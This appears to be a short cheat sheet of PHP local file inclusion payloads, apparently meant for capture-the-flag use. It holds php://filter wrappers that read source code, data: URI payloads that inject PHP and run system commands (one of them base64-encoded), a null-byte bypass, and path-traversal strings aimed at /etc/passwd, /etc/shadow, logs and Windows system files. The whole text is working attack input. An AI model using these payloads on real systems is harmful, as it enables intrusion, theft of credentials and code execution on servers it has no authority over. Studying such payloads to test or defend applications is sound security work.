### Base64 Encode
php://filter/convert.base64-encode/resource=index.php

### Read Without Encoding
php://filter/resource=flag.txt

### Chained Filters
php://filter/convert.base64-encode|convert.base64-decode/resource=index.php

### Data URI (Code Injection)
data:text/plain,<?php phpinfo(); ?>
data:,<?system(['x']);?>&x=ls
data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls

## Null Byte (PHP < 5.3.4)
?page=../../../etc/passwd%00

## Path Traversal
../../../../etc/passwd
../../../../../../etc/passwd
../../../../windows/win.ini

## More Linux Files
/etc/shadow
/etc/hosts
/proc/version
/var/log/apache2/access.log

## More Windows Files
C:\boot.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
